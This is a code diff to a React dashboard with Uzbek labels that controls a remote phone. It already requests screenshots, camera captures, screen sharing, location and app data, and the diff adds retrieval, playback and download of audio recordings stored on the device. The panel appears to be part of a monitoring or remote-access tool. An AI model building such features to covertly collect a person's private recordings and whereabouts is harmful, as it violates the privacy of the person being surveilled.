@@ -11,11 +11,13 @@ type Req = {
   status: string; createdAt: string; resultUrl?: string;
 };
 type AppEntry = { name: string; package: string; minutes?: number };
+type AudioEntry = { name: string; url: string; modifiedAt?: number };
 type ModalContent =
   | { kind: 'image'; url: string }
   | { kind: 'map'; lat: number; lng: number }
   | { kind: 'apps'; data: AppEntry[] }
-  | { kind: 'usage'; data: AppEntry[] };
+  | { kind: 'usage'; data: AppEntry[] }
+  | { kind: 'audio'; data: AudioEntry[] };
 
 const STATUS_COLOR: Record<string, string> = {
   PENDING: '#f59e0b', DONE: '#10b981', FAILED: '#ef4444',
@@ -28,6 +30,7 @@ const TYPE_META: Record<string, { icon: string; label: string }> = {
   LOCATION:     { icon: '📍', label: 'Lokatsiya' },
   APP_LIST:     { icon: '📋', label: 'Ilovalar' },
   APP_USAGE:    { icon: '📊', label: 'Foydalanish' },
+  AUDIO_LIST:   { icon: '🎙️', label: 'Audio yozuvlar' },
 };
 
 function timeAgo(dateStr: string) {
@@ -50,7 +53,7 @@ function isImageType(t: string) {
   return ['SCREENSHOT','CAMERA_FRONT','CAMERA_BACK','SCREEN_SHARE'].includes(t);
 }
 function isJsonType(t: string) {
-  return ['APP_LIST','APP_USAGE'].includes(t);
+  return ['APP_LIST','APP_USAGE','AUDIO_LIST'].includes(t);
 }
 
 const S = {
@@ -234,8 +237,13 @@ export default function Home() {
     if (isJsonType(r.type)) {
       try {
         const res = await fetch(r.resultUrl);
-        const data: AppEntry[] = await res.json();
-        setModal({ kind: r.type === 'APP_LIST' ? 'apps' : 'usage', data });
+        const raw = await res.json();
+        if (r.type === 'AUDIO_LIST') {
+          setModal({ kind: 'audio', data: raw as AudioEntry[] });
+        } else {
+          const data = raw as AppEntry[];
+          setModal({ kind: r.type === 'APP_LIST' ? 'apps' : 'usage', data });
+        }
       } catch (_) {}
       setLoadingId(null); return;
     }
@@ -260,6 +268,7 @@ export default function Home() {
     { type: 'LOCATION',     label: '📍 Lokatsiya' },
     { type: 'APP_LIST',     label: '📋 Ilovalar' },
     { type: 'APP_USAGE',    label: '📊 Foydalanish' },
+    { type: 'AUDIO_LIST',   label: '🎙️ Audio yozuvlar' },
   ];
 
   return (
@@ -504,6 +513,26 @@ export default function Home() {
                     </div>
                   ))}
                 </div>
+              </div>
+            )}
+
+            {modal.kind === 'audio' && (
+              <div style={{ padding: 24, minWidth: 380 }}>
+                <h3 style={{ fontSize: 16, fontWeight: 700, margin: '0 0 4px', color: '#f1f5f9' }}>🎙️ Oxirgi audio yozuvlar</h3>
+                <p style={{ fontSize: 12, color: '#475569', margin: '0 0 16px' }}>Qurilmada saqlangan mavjud yozuvlar</p>
+                {modal.data.length === 0 ? (
+                  <div style={{ padding: '24px 0', color: '#64748b', textAlign: 'center' }}>Audio yozuv topilmadi.</div>
+                ) : (
+                  <div style={{ display: 'grid', gap: 12 }}>
+                    {modal.data.map((audio, i) => (
+                      <div key={i} style={{ padding: 12, background: 'rgba(255,255,255,0.04)', borderRadius: 10, border: '1px solid rgba(255,255,255,0.06)' }}>
+                        <div style={{ fontSize: 12, color: '#cbd5e1', marginBottom: 8 }}>{audio.name}</div>
+                        <audio controls preload="none" src={audio.url} style={{ width: '100%' }} />
+                        <a href={audio.url} target="_blank" download style={{ ...S.btnPrimary, display: 'inline-block', textDecoration: 'none', fontSize: 12, marginTop: 8 }}>⬇ Yuklab olish</a>
+                      </div>
+                    ))}
+                  </div>
+                )}
               </div>
             )}
 
